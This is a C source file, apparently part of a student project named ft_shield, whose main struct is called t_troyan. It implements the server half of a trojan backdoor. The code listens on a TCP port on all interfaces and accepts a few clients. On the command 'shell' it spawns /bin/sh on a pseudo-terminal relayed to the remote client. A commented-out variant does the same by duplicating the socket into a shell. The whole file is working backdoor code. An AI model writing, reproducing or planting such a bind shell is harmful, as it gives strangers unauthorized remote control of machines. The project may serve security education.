# include "ft_shield.h"
#include <pty.h>
#include <termios.h>

int init_servsocket(t_troyan *shield)
{
    shield->opc = 1;

    shield->socketfd = socket(AF_INET, SOCK_STREAM, 0);
    if (shield->socketfd == -1)
        return (-1);
    if (setsockopt(shield->socketfd, SOL_SOCKET, SO_REUSEADDR, &shield->opc, sizeof(shield->opc)) == -1)
    {
        close(shield->socketfd);
        return (-1);
    }

    memset(&shield->target_addr, 0, sizeof(shield->target_addr));
    shield->target_addr.sin_family = AF_INET;
    shield->target_addr.sin_addr.s_addr = INADDR_ANY;            // Escuchar en cualquier interfaz
    shield->target_addr.sin_port = htons(PORT);                  // Convertir puerto al formato de red

    if (bind(shield->socketfd, (struct sockaddr *)&shield->target_addr, sizeof(shield->target_addr)) == -1)
    {
        close(shield->socketfd);
        return (-1);
    }

    if (listen(shield->socketfd, BACKLOG) == -1)
    {
        close(shield->socketfd);
        return (-1);
    }
    return (0);
}


/*void    ft_connection(t_troyan *shield, int socket_client)
{
    char *args[] = {"/bin/sh", NULL};

    if (ft_auth(socket_client) == 0)
    {
        dup2(socket_client, 0);
        dup2(socket_client, 1);
        dup2(socket_client, 2);

        close(socket_client);

        execve("/bin/sh", args, shield->env);
        exit (1);
    }
    else
        close(socket_client);
}*/

static void	ft_relay(int client_fd, int pty_master)
{
	fd_set	fds;
	char	buf[1024];
	int		n;
	int		max_fd;

	max_fd = client_fd > pty_master ? client_fd : pty_master;
	while (1)
	{
		FD_ZERO(&fds);
		FD_SET(client_fd, &fds);
		FD_SET(pty_master, &fds);
		if (select(max_fd + 1, &fds, NULL, NULL, NULL) < 0)
			break ;

		if (FD_ISSET(client_fd, &fds))
		{
			n = read(client_fd, buf, sizeof(buf));
			if (n <= 0)
				break ;
			write(pty_master, buf, n);
		}

		if (FD_ISSET(pty_master, &fds))
		{
			n = read(pty_master, buf, sizeof(buf));
			if (n <= 0)
				break ;
			write(client_fd, buf, n);
		}
	}
}

static void	ft_run_shell(int client_fd)
{
	int		pty_master;
	int		pty_slave;
	pid_t	pid;

	if (openpty(&pty_master, &pty_slave, NULL, NULL, NULL) < 0)
		return ;

	pid = fork();
	if (pid < 0)
	{
		close(pty_master);
		close(pty_slave);
		return ;
	}
	if (pid == 0)
	{
		close(pty_master);
		setsid();
		ioctl(pty_slave, TIOCSCTTY, 0);
		dup2(pty_slave, STDIN_FILENO);
		dup2(pty_slave, STDOUT_FILENO);
		dup2(pty_slave, STDERR_FILENO);
		close(pty_slave);
		char *argv[] = {"/bin/sh", NULL};
		char *envp[] = {"TERM=xterm", NULL};
		execve("/bin/sh", argv, envp);
		exit(1);
	}
	close(pty_slave);
	ft_relay(client_fd, pty_master);
	close(pty_master);
	waitpid(pid, NULL, 0);
}

void	ft_connection(int client_fd)
{
	char	buffer[256];
	int		bytes;

    write(client_fd, "press ? to show help\n", 22);
	signal(SIGCHLD, SIG_IGN);
	while (1)
	{
		write(client_fd, "$> ", 3);
		memset(buffer, 0, sizeof(buffer));
		bytes = read(client_fd, buffer, sizeof(buffer) - 1);
		if (bytes <= 0)
			return ;

		if (buffer[bytes - 1] == '\n')
			buffer[--bytes] = '\0';
		if (bytes > 0 && buffer[bytes - 1] == '\r')
			buffer[--bytes] = '\0';

		if (strcmp(buffer, "?") == 0)
		{
			write(client_fd, "? -> show help\n", 16);
			write(client_fd, "shell -> spawn remote shell\n", 29);
		}
		else if (strcmp(buffer, "shell") == 0)
		{
			write(client_fd, "Spawning shell on port 4242\n", 28);
			ft_run_shell(client_fd);
			return ;
		}
	}
}

int loop_server(t_troyan *shield)
{
    fd_set              readfds;
    int                 i;
    int                 maxfd;
    int                 socket_client;
    int                 activity;
    int                 clients[3];
    int                 asigned = 0;
    struct sockaddr_in  addr_client;
    struct timeval      timeout;
    socklen_t           addr_len = sizeof(addr_client);

    memset(clients, 0, sizeof(clients));
    while (!g_sigint_received)
    {
        FD_ZERO(&readfds);
        FD_SET(shield->socketfd, &readfds);
        maxfd = shield->socketfd;

        for (i = 0; i < 3; i++)
        {
            if (clients[i] > 0)
            {
                FD_SET(clients[i], &readfds);
                if (clients[i] > maxfd)
                    maxfd = clients[i];
            }
        }

        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        activity = select(maxfd + 1, &readfds, NULL, NULL, &timeout);
        if (activity < 0)
        {
            if (errno == EINTR)
                continue;
            return (-1);
        }
        else if (activity == 0)
            continue;
        
        if (FD_ISSET(shield->socketfd, &readfds))
        {
            socket_client = accept(shield->socketfd, (struct sockaddr *)&addr_client, &addr_len);
            if (socket_client < 0)
                continue;
            asigned = 0;
            for (i = 0; i < 3; i++)
            {
                if (clients[i] == 0)
                {
                    clients[i] = socket_client;
                    asigned = 1;
                    break;
                }
            }
            if (asigned == 0)
                close(socket_client);
        }

        for (i = 0; i < 3; i++)
        {
            if (clients[i] > 0 && FD_ISSET(clients[i], &readfds))
            {
                ft_connection(clients[i]);
                clients[i] = 0;
            }
        }
    }
    return (0);
}